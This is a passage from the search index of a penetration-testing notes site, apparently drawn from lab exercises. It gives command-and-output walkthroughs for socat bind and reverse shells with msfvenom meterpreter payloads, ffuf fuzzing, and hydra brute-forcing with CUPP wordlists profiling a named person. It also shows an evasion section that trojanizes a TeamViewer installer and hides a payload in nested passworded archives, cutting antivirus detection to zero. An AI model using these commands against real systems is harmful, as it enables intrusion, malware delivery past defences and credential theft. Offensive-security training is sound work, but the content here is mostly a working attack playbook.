8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;\n</code></pre></p>","title":"WebServer Pivoting w/ Rpivot"},{"location":"ptpf/socat/socat_bind_shell/","text":"<p>We can create a bind shell payload for Windows and execute it on the Windows host. </p> <p>Creating the Windows Payload <pre><code>secops@kali[/kali]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 499 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupjob.exe\n</code></pre></p> <p><code>socat bind shell</code></p> <pre><code>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443\n</code></pre> <p>Configuring &amp; Starting the Bind multi/handler <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp\npayload =&gt; windows/x64/meterpreter/bind_tcp\nmsf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64\nRHOST =&gt; 10.129.202.64\nmsf6 exploit(multi/handler) &gt; set LPORT 8080\nLPORT =&gt; 8080\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started bind TCP handler against 10.129.202.64:8080\n</code></pre></p> <p>Establishing Meterpreter Session <pre><code>[*] Sending stage (200262 bytes) to 10.129.202.64\n[*] Meterpreter session 1 opened (10.10.14.18:46253 -&gt; 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500\n\nmeterpreter &gt; getuid\nServer username: LEGALCORP\\victor\n</code></pre></p>","title":"Bind Shell"},{"location":"ptpf/socat/socat_reverse_shell/","text":"<p>Starting Socat Listener <pre><code>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80\n</code></pre></p> <p>Creating the Windows Payload <pre><code>secops@kali[/kali]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 743 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupscript.exe\n</code></pre></p> <p>Configuring &amp; Starting the multi/handler <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 80\nlport =&gt; 80\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started HTTPS reverse handler on https://0.0.0.0:80\n</code></pre></p> <p>We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time. <pre><code>[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!\n[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...\n[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!\n[*] Meterpreter session 1 opened (10.10.14.18:80 -&gt; 127.0.0.1 ) at 2022-03-07 11:08:10 -0500\n\nmeterpreter &gt; getuid\nServer username: LEGALCORP\\victor\n</code></pre></p>","title":"Reverse Shell"},{"location":"tools/ffuf/","text":"Basic Fuzzing  Directory Fuzzing <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ\n</code></pre>  Extension Fuzzing <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ\n</code></pre>  Page Fuzzing <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php\n</code></pre>  Recursive Scanning <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v\n</code></pre>  --------------  Domain Fuzzing   Sub-domain Fuzzing <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.secops.cc/\n</code></pre>  Vhost Fuzzing  <pre><code>ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://secops.cc:PORT/ -H 'Host: FUZZ.secops.cc' -fs xxx\n</code></pre>  -----------  Parameter Fuzzing  GET Request Fuzzing <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.secops.cc:PORT/admin/admin.php?FUZZ=key -fs xxx\n</code></pre>  POST Request Fuzzing <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.secops.cc:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n</code></pre>  Value Fuzzing  Create a simple Custom Wordlist <pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done\n</code></pre> <pre><code>ffuf -w ids.txt:FUZZ -u http://admin.secops.cc:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n</code></pre>","title":"Ffuf"},{"location":"tools/hydra/","text":"Basic HTTP Auth Brute Forcing Check for Default Credentials <pre><code>secops@kali[/kali]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /\n</code></pre> Username Brute Force <pre><code>secops@kali[/kali]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /\n</code></pre>  Login Form Attacks <pre><code>secops@kali[/kali]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'\"\n</code></pre>  Personalized Wordlists CUPP <pre><code>secops@kali[/kali]$ cupp -i\n\n___________\n   cupp.py!                 # Common\n      \\                     # User\n       \\   ,__,             # Passwords\n        \\  (oo)____         # Profiler\n           (__)    )\\\n              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]\n                            [ Mebus | https://github.com/Mebus/]\n\n\n[+] Insert the information about the victim to make a dictionary\n[+] If you don't know all the info, just hit enter when asked! ;)\n\n&gt; First Name: William\n&gt; Surname: Gates\n&gt; Nickname: Bill\n&gt; Birthdate (DDMMYYYY): 28101955\n\n&gt; Partners) name: Melinda\n&gt; Partners) nickname: Ann\n&gt; Partners) birthdate (DDMMYYYY): 15081964\n\n&gt; Child's name: Jennifer\n&gt; Child's nickname: Jenn\n&gt; Child's birthdate (DDMMYYYY): 26041996\n\n&gt; Pet's name: Nila\n&gt; Company name: Microsoft\n\n&gt; Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory\n&gt; Do you want to add special chars at the end of words? Y/[N]: y\n&gt; Do you want to add some random numbers at the end of words? Y/[N]:y\n&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y\n\n[+] Now making a dictionary...\n[+] Sorting list and removing duplicates...\n[+] Saving dictionary to william.txt, counting 43368 words.\n[+] Now load your pistolero with william.txt and shoot! Good luck!\n</code></pre> <p>Personalized password wordlist saved as <code>william.txt</code>.</p> Password Policy <p>This wordlist is very long. If we know the password policy we can remove any passwords that do not meet the password policy.</p> <pre><code>sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8\nsed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt # remove no special chars\nsed -ri '/[0-9]+/!d' william.txt            # remove no numbers\n</code></pre> <p>These commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.</p> Custom Username Wordlist <p>We should also consider creating a personalized username wordlist based on the person's available details.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/urbanadventurer/username-anarchy.git\n\nCloning into 'username-anarchy'...\nremote: Enumerating objects: 386, done.\nremote: Total 386 (delta 0), reused 0 (delta 0), pack-reused 386\nReceiving objects: 100% (386/386), 16.76 MiB | 5.38 MiB/s, done.\nResolving deltas: 100% (127/127), done.\n</code></pre> <pre><code>./username-anarchy Bill Gates &gt; bill.txt\n</code></pre>","title":"Hydra"},{"location":"tools/nmap/","text":"","title":"Nmap"},{"location":"tools/nmap/#scanning-options","text":"Nmap Option Description     <code>10.10.10.0/24</code> Target network range.   <code>-sn</code> Disables port scanning.   <code>-Pn</code> Disables ICMP Echo Requests   <code>-n</code> Disables DNS Resolution.   <code>-PE</code> Performs the ping scan by using ICMP Echo Requests against the target.   <code>--packet-trace</code> Shows all packets sent and received.   <code>--reason</code> Displays the reason for a specific result.   <code>--disable-arp-ping</code> Disables ARP Ping Requests.   <code>--top-ports=&lt;num&gt;</code> Scans the specified top ports that have been defined as most frequent.   <code>-p-</code> Scan all ports.   <code>-p22-110</code> Scan all ports between 22 and 110.   <code>-p22,25</code> Scans only the specified ports 22 and 25.   <code>-F</code> Scans top 100 ports.   <code>-sS</code> Performs an TCP SYN-Scan.   <code>-sA</code> Performs an TCP ACK-Scan.   <code>-sU</code> Performs an UDP Scan.   <code>-sV</code> Scans the discovered services for their versions.   <code>-sC</code> Perform a Script Scan with scripts that are categorized as \"default\".   <code>--script &lt;script&gt;</code> Performs a Script Scan by using the specified scripts.   <code>-O</code> Performs an OS Detection Scan to determine the OS of the target.   <code>-A</code> Performs OS Detection, Service Detection, and traceroute scans.   <code>-D RND:5</code> Sets the number of random Decoys that will be used to scan the target.   <code>-e</code> Specifies the network interface that is used for the scan.   <code>-S 10.10.10.200</code> Specifies the source IP address for the scan.   <code>-g</code> Specifies the source port for the scan.   <code>--dns-server &lt;ns&gt;</code> DNS resolution is performed by using a specified name server.","title":"Scanning Options"},{"location":"tools/nmap/#output-options","text":"Nmap Option Description     <code>-oA filename</code> Stores the results in all available formats starting with the name of \"filename\".   <code>-oN filename</code> Stores the results in normal format with the name \"filename\".   <code>-oG filename</code> Stores the results in \"grepable\" format with the name of \"filename\".   <code>-oX filename</code> Stores the results in XML format with the name of \"filename\".","title":"Output Options"},{"location":"tools/nmap/#performance-options","text":"Nmap Option Description     <code>--max-retries &lt;num&gt;</code> Sets the number of retries for scans of specific ports.   <code>--stats-every=5s</code> Displays scan's status every 5 seconds.   <code>-v/-vv</code> Displays verbose output during the scan.   <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout.   <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout.   <code>--min-rate 300</code> Sets the number of packets that will be sent simultaneously.   <code>-T &lt;0-5&gt;</code> Specifies the specific timing template.","title":"Performance Options"},{"location":"tools/nmap/#scan-network-range","text":"<pre><code>secops@kali[/kali]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n\n10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28\n</code></pre>","title":"Scan Network Range"},{"location":"tools/nmap/#scan-ip-list","text":"<pre><code>secops@kali[/kali]$ cat hosts.lst\n\n10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28\n</code></pre> <pre><code>secops@kali[/kali]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre>","title":"Scan IP List"},{"location":"tools/nmap/#discovering-open-udp-ports","text":"<pre><code>secops@kali[/kali]$ sudo nmap 10.129.2.28 -F -sU\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.059s latency).\nNot shown: 95 closed ports\nPORT     STATE         SERVICE\n68/udp   open|filtered dhcpc\n137/udp  open          netbios-ns\n138/udp  open|filtered netbios-dgm\n631/udp  open|filtered ipp\n5353/udp open          zeroconf\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 98.07 seconds\n</code></pre>","title":"Discovering Open UDP Ports"},{"location":"tools/nmap/#service-version-detection","text":"<pre><code>secops@kali[/kali]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:44 CEST\n[Space Bar]\nStats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 3.64% done; ETC: 19:45 (0:00:53 remaining)\n</code></pre>","title":"Service Version Detection"},{"location":"tools/nmap/#aggresive-scan","text":"<pre><code>secops@kali[/kali]$ sudo nmap 10.129.2.28 -p 80 -A\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:38 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.012s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: WordPress 5.3.4\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: blog.LEGALCORP.com\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), \nAXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), \nLinux 2.6.32 - 2.6.35 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT      ADDRESS\n1   11.91 ms 10.129.2.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.36 seconds\n</code></pre>","title":"Aggresive Scan"},{"location":"tools/msf/additional_features/evasion/","text":"Evasion Techniques <p>Most host-based anti-virus software nowadays relies mainly on <code>Signature-based Detection</code> to identify aspects of malicious code present in a software sample. These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches.</p> <p>msfvenom can embed payloads into any executable file:</p> <pre><code>secops@kali[/kali]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5\n\nAttempting to read payload from STDIN...\nFound 1 compatible encoders\nAttempting to encode payload with 5 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 27 (iteration=0)\nx86/shikata_ga_nai succeeded with size 54 (iteration=1)\nx86/shikata_ga_nai succeeded with size 81 (iteration=2)\nx86/shikata_ga_nai succeeded with size 108 (iteration=3)\nx86/shikata_ga_nai succeeded with size 135 (iteration=4)\nx86/shikata_ga_nai chosen with final size 135\nPayload size: 135 bytes\nSaved as: /home/user/Desktop/TeamViewer_Setup.exe\n</code></pre>  Archives <p>Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.</p> <p>Generating Payload <pre><code>secops@kali[/kali]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5\n\nAttempting to read payload from STDIN...\nFound 1 compatible encoders\nAttempting to encode payload with 5 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 27 (iteration=0)\nx86/shikata_ga_nai succeeded with size 54 (iteration=1)\nx86/shikata_ga_nai succeeded with size 81 (iteration=2)\nx86/shikata_ga_nai succeeded with size 108 (iteration=3)\nx86/shikata_ga_nai succeeded with size 135 (iteration=4)\nx86/shikata_ga_nai chosen with final size 135\nPayload size: 135 bytes\nSaved as: /home/user/test.js\n</code></pre></p> <pre><code>secops@kali[/kali]$ cat test.js\n\n\ufffd+n\"\ufffd\ufffd\ufffd\ufffdt$\ufffdG4\u02711zz\ufffd\ufffdj\ufffdV6\ufffd\ufffd\ufffd\ufffdic\ufffd\ufffdo\ufffdBs&gt;\ufffd\ufffdZ*\ufffd\ufffd\ufffd\ufffd\ufffd9vt\ufffd\ufffd%\ufffd\ufffd1\ufffd\n&lt;...SNIP...&gt;\n\ufffdQa*\ufffd\ufffd\ufffd\u07b4\ufffd\ufffdRW\ufffd%\u0160.\\\ufffd=;.l\ufffdT\ufffd\ufffd\ufffdXF\ufffd\ufffd\ufffdT\ufffd\ufffd\n</code></pre> <p>If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.</p> <pre><code>secops@kali[/kali]$ msf-virustotal -k &lt;API key&gt; -f test.js \n\n[*] WARNING: When you upload or otherwise submit content, you give VirusTotal\n[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable\n[*] licence to use, edit, host, store, reproduce, modify, create derivative works,\n[*] communicate, publish, publicly perform, publicly display and distribute such\n[*] content. To read the complete Terms of Service for VirusTotal, please go to the\n[*] following link:\n[*] https://www.virustotal.com/en/about/terms-of-service/\n[*] \n[*] If you prefer your own API key, you may obtain one at VirusTotal.\n\n[*] Enter 'Y' to acknowledge: Y\n\n\n[*] Using API key: &lt;API key&gt;\n[*] Please wait while I upload test.js...\n[*] VirusTotal: Scan request successfully queued, come back later for the report\n[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a\n[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309\n[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105\n[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167047\n[*] Requesting the report...\n[*] Received code 0. Waiting for another 60 seconds...\n[*] Analysis Report: test.js (11 / 59): &lt;...SNIP...&gt;\n====================================================================================================\n\n Antivirus             Detected  Version               Result                             Update\n ---------             --------  -------               ------                             ------\n ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510\n AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510\n Acronis               false     1.2.0.108                                                20220426\n Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510\n AhnLab-V3             false     3.21.3.10230                                             20220510\n Antiy-AVL             false     3.0                                                      20220510\n Arcabit               false     1.0.0.889                                                20220510\n Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510\n Avira                 false     8.3.3.14                                                 20220510\n Baidu                 false     1.0.0.2                                                  20190318\n BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510\n BitDefenderTheta      false     7.2.37796.0                                              20220428\n Bkav                  false     1.3.0.9899                                               20220509\n CAT-QuickHeal         false     14.00                                                    20220510\n CMC                   false     2.10.2019.1                                              20211026\n ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509\n Comodo                false     34607                                                    20220510\n Cynet                 false     4.0.0.27                                                 20220510\n Cyren                 false     6.5.1.2                                                  20220510\n DrWeb                 false     7.0.56.4040                                              20220510\n ESET-NOD32            false     25243                                                    20220510\n Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510\n F-Secure              false     18.10.978.51                                             20220510\n FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510\n Fortinet              false     6.2.142.0                                                20220510\n GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510\n Gridinsoft            false     1.0.77.174                                               20220510\n Ikarus                false     6.0.24.0                                                 20220509\n Jiangmin              false     16.0.100                                                 20220509\n K7AntiVirus           false     12.12.42275                                              20220510\n K7GW                  false     12.12.42275                                              20220510\n Kaspersky             false     21.0.1.45                                                20220510\n Kingsoft              false     2017.9.26.565                                            20220510\n Lionic                false     7.5                                                      20220510\n MAX                   true      2019.9.16.1           malware (ai score=89)              20220510\n Malwarebytes          false     4.2.2.27                                                 20220510\n MaxSecure             false     1.0.0.1                                                  20220510\n McAfee                false     6.0.6.653                                                20220510\n McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510\n MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510\n Microsoft             false     1.1.19200.5                                              20220510\n NANO-Antivirus        false     1.0.146.25588                                            20220510\n Panda                 false     4.6.4.2                                                  20220509\n Rising                false     25.0.0.27                                                20220510\n SUPERAntiSpyware      false     5.6.0.1032                                               20220507\n Sangfor               false     2.14.0.0                                                 20220507\n Sophos                false     1.4.1.0                                                  20220510\n Symantec              false     1.17.0.0                                                 20220510\n TACHYON               false     2022-05-10.02                                            20220510\n Tencent               false     1.0.0.1                                                  20220510\n TrendMicro            false     11.0.0.1006                                              20220510\n TrendMicro-HouseCall  false     10.0.0.1040                                              20220510\n VBA32                 false     5.0.0                                                    20220506\n ViRobot               false     2014.3.20.0                                              20220510\n VirIT                 false     9.5.191                                                  20220509\n Yandex                false     5.5.2.24                                                 20220428\n Zillya                false     2.0.0.4627                                               20220509\n ZoneAlarm             false     1.0                                                      20220510\n Zoner                 false     2.2.2.0                                                  20220509\n</code></pre> <p>Archiving it two times, passwording both archives upon creation, and removing the <code>.rar</code>/<code>.zip</code>/<code>.7z</code> extension from their names. For this purpose, we can install the RAR utility from RARLabs, which works precisely like WinRAR on Windows.</p> <p>Archiving the Payload <pre><code>secops@kali[/kali]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz\nsecops@kali[/kali]$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar\nsecops@kali[/kali]$ rar a ~/test.rar -p ~/test.js\n\nEnter password (will not be echoed): ******\nReenter password: ******\n\nRAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017\nTrial version             Type 'rar -?' for help\nEvaluation copy. Please register.\n\nCreating archive test.rar\nAdding    test.js                                                     OK \nDone\n</code></pre></p> <pre><code>secops@kali[/kali]$ ls\n\ntest.js   test.rar\n</code></pre> <p>Removing the .RAR Extension <pre><code>secops@kali[/kali]$ mv test.rar test\nsecops@kali[/kali]$ ls\n\ntest   test.js\n</code></pre></p> <p>Archiving the Payload Again <pre><code>secops@kali[/kali]$ rar a test2.rar -p test\n\nEnter password (will not be echoed): ******\nReenter password: ******\n\nRAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017\nTrial version             Type 'rar -?' for help\nEvaluation copy. Please register.\n\nCreating archive test2.rar\nAdding    test                                                        OK \nDone\n</code></pre></p> <p>Removing the .RAR Extension <pre><code>secops@kali[/kali]$ mv test2.rar test2\nsecops@kali[/kali]$ ls\n\ntest   test2   test.js\n</code></pre></p> <p>The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.</p> <pre><code>secops@kali[/kali]$ msf-virustotal -k &lt;API key&gt; -f test2\n\n[*] Using API key: &lt;API key&gt;\n[*] Please wait while I upload test2...\n[*] VirusTotal: Scan request successfully queued, come back later for the report\n[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d\n[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429\n[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad\n[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167804\n[*] Requesting the report...\n[*] Received code 0. Waiting for another 60 seconds...\n[*] Received code -2. Waiting for another 60 seconds...\n[*] Received code -2. Waiting for another 60 seconds...\n[*] Received code -2. Waiting for another 60 seconds...\n[*] Received code -2. Waiting for another 60 seconds...\n[*] Received code -2. Waiting for another 60 seconds...\n[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad\n=================================================================================================\n\n Antivirus             Detected  Version         Result  Update\n ---------             --------  -------         ------  ------\n ALYac                 false     1.1.3.1                 20220510\n Acronis               false     1.2.0.108               20220426\n Ad-Aware              false     3.0.21.193              20220510\n AhnLab-V3             false     3.21.3.10230            20220510\n Antiy-AVL             false     3.0                     20220510\n Arcabit               false     1.0.0.889               20220510\n Avira                 false     8.3.3.14                20220510\n BitDefender           false     7.2                     20220510\n BitDefenderTheta      false     7.2.37796.0             20220428\n Bkav                  false     1.3.0.9899              20220509\n CAT-QuickHeal         false     14.00                   20220510\n CMC                   false     2.10.2019.1             20211026\n ClamAV                false     0.105.0.0               20220509\n Comodo                false     34606                   20220509\n Cynet                 false     4.0.0.27                20220510\n Cyren                 false     6.5.1.2                 20220510\n DrWeb                 false     7.0.56.4040             20220510\n ESET-NOD32            false     25243                   20220510\n Emsisoft              false     2021.5.0.7597           20220510\n F-Secure              false     18.10.978.51            20220510\n FireEye               false     35.24.1.0               20220510\n Fortinet              false     6.2.142.0               20220510\n Gridinsoft            false     1.0.77.174              20220510\n Jiangmin              false     16.0.100                20220509\n K7AntiVirus           false     12.12.42275             20220510\n K7GW                  false     12.12.42275             20220510\n Kingsoft              false     2017.9.26.565           20220510\n Lionic                false     7.5                     20220510\n MAX                   false     2019.9.16.1             20220510\n Malwarebytes          false     4.2.2.27                20220510\n MaxSecure             false     1.0.0.1                 20220510\n McAfee-GW-Edition     false     v2019.1.2+3728          20220510\n MicroWorld-eScan      false     14.0.409.0              20220510\n NANO-Antivirus        false     1.0.146.25588           20220510\n Panda                 false     4.6.4.2                 20220509\n Rising                false     25.0.0.27               20220510\n SUPERAntiSpyware      false     5.6.0.1032              20220507\n Sangfor               false     2.14.0.0                20220507\n Symantec              false     1.17.0.0                20220510\n TACHYON               false     2022-05-10.02           20220510\n Tencent               false     1.0.0.1                 20220510\n TrendMicro-HouseCall  false     10.0.0.1040             20220510\n VBA32                 false     5.0.0                   20220506\n ViRobot               false     2014.3.20.0             20220510\n VirIT                 false     9.5.191                 20220509\n Yandex                false     5.5.2.24                20220428\n Zillya                false     2.0.0.4627              20220509\n ZoneAlarm             false     1.0                     20220510\n Zoner                 false     2.2.2.0                 20220509\n</code></pre> <p>As we can see from the above, this is an excellent way to transfer data both <code>to</code> and <code>from</code> the target host.</p>","title":"Evasion"},{"location":"tools/msf/components/msf_modules/","text":"MSF - Specific Search <pre><code>msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft\n\nMatching Modules\n================\n\n   #  Name                                            Disclosure Date  Rank       Check  Description\n   -  ----                                            ---------------  ----       -----  -----------\n   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE\n   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE\n   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE\n</code></pre>  MSF - Permanent Target Specification <p><code>setg</code>, specifies options selected by us as permanent until the program is restarted.</p> <pre><code>msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg RHOSTS 10.10.10.40\n\nRHOSTS =&gt; 10.10.10.40\n\n\nmsf6 exploit(windows/smb/ms17_010_psexec) &gt; options\n\n   Name                  Current Setting                          Required  Description\n   ----                  ---------------                          --------  -----------\n   DBGTRACE              false                                    yes       Show extra debug trace info\n   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction\n   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)\n   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check\n                         rdlists/named_pipes.txt\n   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework\n                                                                            /wiki/Using-Metasploit\n   RPORT                 445                                      yes       The Target port (TCP)\n&lt;SNIP&gt;\n</code></pre>","title":"Modules"},{"location":"tools/msf/components/msf_payloads/","text":"Searching for Specific Payload <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads\n\n   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager\n   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support\n   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager\n   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager\n   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)\n   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind 